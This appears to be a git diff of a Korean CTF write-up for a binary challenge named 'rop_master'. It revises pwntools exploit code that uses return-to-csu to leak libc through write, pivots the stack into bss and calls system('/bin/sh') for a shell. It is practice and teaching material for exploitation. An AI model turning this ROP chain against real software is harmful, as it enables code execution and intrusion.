@@ -207,7 +207,7 @@ p.interactive()
 
 ## 3 rop_master
 
-16만큼의 bof가 나기 때문에 ret 주소까지밖에 덮을 수 없으므로 다른 방식으로 rop를 진행해야 한다. stack에는 NX bit로 인해 실행 권한이 없으므로 name이 저장된 data 영역에 fake stack을 구성한다. fake stack에서 write함수를 통해 write함수를 구해 와야 하는데, pop_rdx gadget이 바이너리에 없으므로 return to csu 기법을 이용해야 한다. rtc를 이용하여 gadget을 설정하여 write함수의 주소를 구해올 수 있다. stack pivoting을 진행하고 main으로 다시 돌아간 뒤 libc_leak을 하여 얻어낸 system_addr와 binsh를 이용하여 rtl을 하는 payload를 작성한다. 3회 main으로 돌아가면 쉘을 얻을 수 있다.
+16만큼의 bof가 나기 때문에 ret 주소까지밖에 덮을 수 없으므로 다른 방식으로 rop를 진행해야 한다. stack에는 NX bit로 인해 실행 권한이 없으므로 name이 저장된 data 영역에 fake stack을 구성한다. fake stack에서 write함수를 통해 write함수를 구해 와야 하는데, pop_rdx gadget이 바이너리에 없으므로 return to csu 기법을 이용해야 한다. rtc를 이용하여 gadget을 설정하여 write(1, write_got, 8)을 실행할 수 있다. 또한 이후에 read(0, bss, 32)를 이용하여 입력을 받도록 하고 system('/bin/sh')를 호출하는 payload를 입력한다. bss에 payload를 입력하는  bss 영역에 stack pivoting을 진행한다. 
 
 
 
@@ -231,7 +231,7 @@ name = 0x601060
 pop_rdi = 0x00400613
 pop_rsp_pop3_ret = 0x0040060d
 leave_ret = 0x004005a2
-bss = e.bss() + 0x400
+bss = e.bss()
 
 
 
@@ -253,21 +253,21 @@ payload += p64(0) #rbx
 payload += p64(1) #rbp
 payload += p64(read_got) #r12
 payload += p64(0) #r13->edi
-payload += p64(bss+32) #r14->rsi
-payload += p64(40) #r15->rdx
+payload += p64(bss+24) #r14->rsi
+payload += p64(32) #r15->rdx
 payload += p64(csu1)
 
 #3 stack pivoting by rtc
-payload += "D"*16
+payload += b"D"*16
 payload += p64(bss)
-payload += "E"*32           
+payload += b"E"*32           
 payload += p64(pop_rsp_pop3_ret)
 payload += p64(bss)
 
 
 p.recvuntil(b"Your name : ")
 #pause()
-p.send(payload)
+p.send(payload)	
 
 
 #4 name stack pivoting
@@ -283,15 +283,14 @@ p.send(payload)
 
 write_offset = libc.symbols['write']
 system_offset = libc.symbols['system']
-write_addr = u64(p.recv(8).ljust(8, '\x00'))
+write_addr = u64(p.recv(8).ljust(8, b'\x00'))
 libc_base = write_addr - write_offset
 system_addr = libc_base + system_offset
 binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
 
 
 #6 system('/bin/sh')
-payload = b'A'*0x8
-payload += p64(pop_rdi)
+payload = p64(pop_rdi)
 payload += p64(binsh)
 payload += p64(0x00400416) #ret
 payload += p64(system_addr)
